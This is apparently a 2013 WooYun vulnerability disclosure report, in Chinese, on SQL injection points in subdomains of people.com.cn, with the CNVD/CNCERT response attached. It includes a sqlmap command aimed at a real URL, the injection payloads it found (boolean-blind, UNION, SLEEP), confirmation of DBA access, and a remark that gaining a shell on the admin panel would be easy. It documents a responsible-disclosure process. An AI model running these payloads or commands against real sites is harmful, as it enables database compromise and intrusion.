wybug_title: 人民网又发现两个SQL注入
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2013-11-25：	细节已通知厂商并且等待厂商处理中									2013-11-28：	厂商已经确认，细节仅向厂商公开									2013-12-08：	细节向核心白帽子及相关领域专家公开									2013-12-18：	细节向普通白帽子公开									2013-12-28：	细节向实习白帽子公开									2014-01-09：	细节向公众公开  简要描述： 2处root权限注入。。。。 详细说明：  null   漏洞证明：  sqlmap.py -u "http://mydesign.people.com.cn/nihongdv/shou.php?page=14&type=3" --is-dba    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 08:38:18[08:38:19] [INFO] resuming back-end DBMS 'mysql'[08:38:19] [INFO] testing connection to the target urlsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: type    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: page=14&type=3 AND 9908=9908    Type: UNION query    Title: MySQL UNION query (NULL) - 10 columns    Payload: page=14&type=3 LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x3a79796e3a,0x6349774257436d7a6366,0x3a6677733a),NULL,NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: page=14&type=3 AND SLEEP(5)---[08:38:19] [INFO] the back-end DBMS is MySQLweb application technology: Apache 2.4.6, PHP 5.3.27back-end DBMS: MySQL 5.0.11[08:38:19] [INFO] testing if current user is DBA[08:38:19] [INFO] fetching current usercurrent user is DBA:    True--------------------------------不华丽的分割线----------------------------------http://gp.people.com.cn/tp.php?newsid=616

http://mydesign.people.com.cn/jjzj/Myapp/index.php // 后台其实和上面一个库 有管理密码 有后台 搞shell不难。未深入   修复方案：  过滤   版权声明：转载请注明来源 s4msung@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2013-11-28 22:35 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT通报给新闻行业主管部门，由其后续联系网站管理单位处置。rank 14 最新状态： 暂无
